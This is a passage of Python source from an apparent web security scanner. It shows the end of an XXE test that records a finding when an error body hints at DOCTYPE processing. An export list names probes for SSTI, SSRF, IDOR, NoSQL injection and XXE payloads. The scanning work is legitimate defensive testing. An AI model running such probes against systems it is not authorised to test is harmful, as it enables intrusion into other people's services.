                # Error-based: DOCTYPE processed — not CRITICAL without
                # content proof (status/errors alone never CRITICAL).
                if not any(f.title.startswith("XXE parser") for f in out):
                    out.append(Finding(
                        title="XXE parser accepted external DTD",
                        severity="MEDIUM",
                        url=url[:240],
                        detail="Server XML stack referenced external-entity / "
                               "DOCTYPE handling in the error body; confirm "
                               "with a controlled file or OOB callback.",
                        evidence=XXE_ERR_HINTS.search(body).group(0)[:80],
                        confidence="Medium",
                        method="POST",
                        location="body",
                        confirm="error-signature",
                    ))
        if len(out) >= 2:
            break
    return out[:3]


__all__ = [
    "test_ssti", "test_ssrf",
    "test_idor", "_cross_session_confirm",
    "test_proto_pollution",
    "test_idor_param", "test_authz_matrix",
    "_nosqli_morph", "test_nosqli",
    "XXE_MARKERS", "_xxe_payloads", "_xxe_targets", "test_xxe",
]
